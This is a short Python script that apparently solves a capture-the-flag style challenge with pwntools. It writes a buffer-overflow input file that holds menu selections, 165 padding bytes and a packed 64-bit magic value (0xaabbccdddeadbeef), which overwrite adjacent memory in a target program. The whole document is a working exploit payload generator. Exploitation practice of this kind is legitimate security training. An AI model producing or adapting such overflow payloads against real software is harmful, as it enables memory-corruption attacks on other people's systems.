from pwn import *

padding = 'A' * 165 + p64(0xaabbccdddeadbeef)

f = open('pl', 'w')
f.write('3\n' + padding + '\n2\n4\n')
f.close()
